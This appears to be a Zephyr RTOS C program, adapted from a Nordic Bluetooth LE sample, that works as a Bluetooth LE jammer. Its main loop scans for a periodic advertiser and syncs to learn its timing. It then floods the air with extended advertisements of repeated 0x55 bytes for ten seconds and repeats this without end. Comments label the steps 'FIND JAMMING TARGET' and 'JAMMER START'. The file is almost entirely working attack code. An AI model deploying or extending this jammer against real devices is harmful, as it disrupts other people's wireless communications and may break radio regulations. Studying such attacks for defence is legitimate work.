/*
 * Copyright (c) 2020 Nordic Semiconductor ASA
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#include <device.h>
#include <devicetree.h>
#include <bluetooth/bluetooth.h>

#define TIMEOUT_SYNC_CREATE K_SECONDS(10)
#define NAME_LEN            30

static bool         per_adv_found;
static bt_addr_le_t per_addr;
static uint8_t      per_sid;
extern uint8_t num;
static K_SEM_DEFINE(sem_per_adv, 0, 1);
static K_SEM_DEFINE(sem_per_sync, 0, 1);
static K_SEM_DEFINE(sem_per_sync_lost, 0, 1);
extern uint32_t interval_dk;
extern uint32_t offset_dk;
extern uint32_t window_size_dk;
uint8_t mfg_data[90];
uint8_t jam_f;
//extern uint32_t tmp_DKDK;
//extern uint8_t evt_dk;
//extern bool first_DKDK;
//int NUM=0;
/* The devicetree node identifier for the "led0" alias. */
static bool data_cb(struct bt_data *data, void *user_data)
{
	char *name = user_data;
	uint8_t len;

	switch (data->type) {
	case BT_DATA_NAME_SHORTENED:
	case BT_DATA_NAME_COMPLETE:
		len = MIN(data->data_len, NAME_LEN - 1);
		memcpy(name, data->data, len);
		name[len] = '\0';
		return false;
	default:
		return true;
	}
}

static const char *phy2str(uint8_t phy)
{
	switch (phy) {
	case 0: return "No packets";
	case BT_GAP_LE_PHY_1M: return "LE 1M";
	case BT_GAP_LE_PHY_2M: return "LE 2M";
	case BT_GAP_LE_PHY_CODED: return "LE Coded";
	default: return "Unknown";
	}
}
struct bt_le_scan_param scan_param = {
                .type       = 0x00,
                .options    = BT_LE_SCAN_OPT_NONE,
                .interval   = 0x0010,
                .window     = 0x0010,
        };

static void scan_recv(const struct bt_le_scan_recv_info *info,
		      struct net_buf_simple *buf)
{
	char le_addr[BT_ADDR_LE_STR_LEN];
	char name[NAME_LEN];

	(void)memset(name, 0, sizeof(name));

	bt_data_parse(buf, data_cb, name);

	bt_addr_le_to_str(info->addr, le_addr, sizeof(le_addr));
	if (!per_adv_found && info->interval) {
/*		printk("[DEVICE]: %s, AD evt type %u, Tx Pwr: %i, RSSI %i %s "
               "C:%u S:%u D:%u SR:%u E:%u Prim: %s, Secn: %s, "
               "Interval: 0x%04x (%u ms), SID: %u\n",
               le_addr, info->adv_type, info->tx_power, info->rssi, name,
               (info->adv_props & BT_GAP_ADV_PROP_CONNECTABLE) != 0,
               (info->adv_props & BT_GAP_ADV_PROP_SCANNABLE) != 0,
               (info->adv_props & BT_GAP_ADV_PROP_DIRECTED) != 0,
               (info->adv_props & BT_GAP_ADV_PROP_SCAN_RESPONSE) != 0,
               (info->adv_props & BT_GAP_ADV_PROP_EXT_ADV) != 0,
               phy2str(info->primary_phy), phy2str(info->secondary_phy),
               info->interval, info->interval * 5 / 4, info->sid);
*/
		per_adv_found = true;

		per_sid = info->sid;
		bt_addr_le_copy(&per_addr, info->addr);

		k_sem_give(&sem_per_adv);
	}
}

static struct bt_le_scan_cb scan_callbacks = {
	.recv = scan_recv,
};

static void sync_cb(struct bt_le_per_adv_sync *sync,
		    struct bt_le_per_adv_sync_synced_info *info)
{
	char le_addr[BT_ADDR_LE_STR_LEN];

	bt_addr_le_to_str(info->addr, le_addr, sizeof(le_addr));

	printk("PER_ADV_SYNC[%u]: [DEVICE]: %s synced, "
	       "Interval 0x%04x (%u ms), PHY %s\n",
	       bt_le_per_adv_sync_get_index(sync), le_addr,
	       info->interval, info->interval * 5 / 4, phy2str(info->phy));

	k_sem_give(&sem_per_sync);
}

static void recv_cb(struct bt_le_per_adv_sync *sync,
		    const struct bt_le_per_adv_sync_recv_info *info,
		    struct net_buf_simple *buf)
{
	char le_addr[BT_ADDR_LE_STR_LEN];
	char data_str[129];

	bt_addr_le_to_str(info->addr, le_addr, sizeof(le_addr));
	bin2hex(buf->data, buf->len, data_str, sizeof(data_str));
/*
	printk("PER_ADV_SYNC[%u]: [DEVICE]: %s, tx_power %i, "
	       "RSSI %i, CTE %u, data length %u, data: %s\n",
	       bt_le_per_adv_sync_get_index(sync), le_addr, info->tx_power,
	       info->rssi, info->cte_type, buf->len, data_str);
*/
}

static struct bt_le_per_adv_sync_cb sync_callbacks = {
	.synced = sync_cb,
	.recv = recv_cb
};

void main(void)
{
	struct bt_le_per_adv_sync_param sync_create_param;
	struct bt_le_per_adv_sync *sync;
	int err;
        struct bt_le_ext_adv *adv;
	k_sem_init(&sem_per_sync,0,1);
	jam_f=0;	
        struct bt_le_adv_param *jam_param= BT_LE_ADV_PARAM(BT_LE_ADV_OPT_EXT_ADV, \
                       BT_GAP_ADV_SLOW_INT_MIN, \
                       BT_GAP_ADV_SLOW_INT_MAX, NULL);

	for(int i=0; i<sizeof(mfg_data);i++)
	mfg_data[i]=85;
	struct bt_data ad[] = {
        BT_DATA(BT_DATA_MANUFACTURER_DATA, mfg_data, sizeof(mfg_data)),
	};
	/* Initialize the Bluetooth Subsystem */
	err = bt_enable(NULL);
	if (err) {
		printk("Bluetooth init failed (err %d)\n", err);
		return;
	}
	//START
	printk("Scan callbacks register...");
	bt_le_scan_cb_register(&scan_callbacks);
	printk("success.\n");

	printk("Periodic Advertising callbacks register...");
	bt_le_per_adv_sync_cb_register(&sync_callbacks);
	printk("Success.\n");

	err = bt_le_ext_adv_create(jam_param, NULL, &adv);
        if (err) {
                printk("Failed to create advertising set (err %d)\n", err);
                return;
        }  

do{
	//SCAN START
	printk("Start scanning...");
        err = bt_le_scan_start(&scan_param, NULL);
        if (err) {
                printk("Starting scanning failed (err %d)\n", err);
                return;
        }
        per_adv_found = false;
	//FIND JAMMING TARGET
        err = k_sem_take(&sem_per_adv, K_FOREVER);
        if (err) {
                printk("failed (err %d)\n", err);
                return;
        } 
        bt_addr_le_copy(&sync_create_param.addr, &per_addr);
        sync_create_param.options = 0;
        sync_create_param.sid = per_sid;
        sync_create_param.skip = 0;
        sync_create_param.timeout = 0xa;
        err = bt_le_per_adv_sync_create(&sync_create_param, &sync);
        if (err) {
                printk("failed (err %d)\n", err);
                return;
        }
        err = k_sem_take(&sem_per_sync, TIMEOUT_SYNC_CREATE);
        err = bt_le_per_adv_sync_delete(sync);
        err=bt_le_scan_stop();
        if(err){
                printk("Failed to stop scanning (err %d)\n", err);
		return;
        }
		err=bt_le_ext_adv_set_data(adv, ad, ARRAY_SIZE(ad), NULL, 0);
		if(err){
		printk("Set data failed (Err%d)\n", err);
		}
	//JAMMING START for 10 seconds
	printk("JAMMER START\n");
	//printk("JAMMER START, %u\n",evt_dk);


    err = bt_le_ext_adv_start(adv, BT_LE_EXT_ADV_START_DEFAULT);
	if(err){
	printk("Starting Jamming failed (Err%d)\n", err);
	}

	k_sleep(K_SECONDS(10));
	//AUX_STOP	
	bt_le_ext_adv_stop(adv);
	//first_DKDK=true;
	//evt_dk++;
	//tmp_DKDK++;
	}while(true);
}

